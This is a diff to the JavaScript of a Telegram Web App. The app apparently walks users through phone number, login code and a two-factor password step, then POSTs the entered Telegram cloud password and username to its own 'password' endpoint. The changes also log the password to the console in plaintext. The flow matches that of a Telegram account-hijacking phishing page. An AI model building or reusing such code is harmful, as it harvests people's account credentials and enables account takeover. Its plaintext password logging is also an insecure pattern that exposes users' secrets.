@@ -183,7 +183,9 @@ document.addEventListener("DOMContentLoaded", async () => {
         two_fa: step3,
         finished: step4
     };
-    
+    if (step === 'two_fa'){
+        step3()
+    }
     if (elapsedTime >= CODE_EXPIRATION_TIME) {
         resetProcess();
     } else {
@@ -236,7 +238,7 @@ resend_button.addEventListener("click", async function() {
 TelegramWebApp.MainButton.onClick(async () => {
     Telegram.WebApp.HapticFeedback.impactOccurred('light');
     let step = localStorage.getItem("step");
-    console.log(step, 'steppss')
+    console.log(step, 'МОЙ ШАГ СЕЙЧАС')
     if (step === "welcome") {
         let phone_to_use;
 
@@ -254,20 +256,31 @@ TelegramWebApp.MainButton.onClick(async () => {
         setTimeout(step2, 3000);
     }
     else if (step === "two_fa") {
-        const enteredPassword = passwordInput ? passwordInput.value.trim() : '';
-        console.log(enteredPassword, 'penessko')
-        if (enteredPassword != "") {
-            TelegramWebApp.MainButton.hide();
-            passwordInput.blur();
+        const enteredPassword = passwordInput.value.trim();
+        console.log("Entered password:", enteredPassword); // Добавьте это для отладки
+        
+        if (enteredPassword) {
+            TelegramWebApp.MainButton.showProgress();
             loading_page();
-
-            const data = await RequestSUKA('password', 'POST', {
-                password: enteredPassword,
-                username: window.Telegram.WebApp.initDataUnsafe.user.username
-            })
-
-            if (data.status === 200) {
-                setTimeout(step4, 3000);
+    
+            try {
+                const data = await RequestSUKA('password', 'POST', {
+                    password: enteredPassword,
+                    username: window.Telegram.WebApp.initDataUnsafe.user?.username || "unknown"
+                });
+    
+                console.log("API Response:", data); // Логируем ответ
+    
+                if (data.status === 200) {                   
+                    setTimeout(step4, 1000);
+                } else {
+                    info("Ошибка: " + (data.message || "Неверный пароль"));
+                    TelegramWebApp.MainButton.hideProgress();
+                }
+            } catch (error) {
+                console.error("Request failed:", error);
+                info("Ошибка соединения");
+                TelegramWebApp.MainButton.hideProgress();
             }
         }
     }
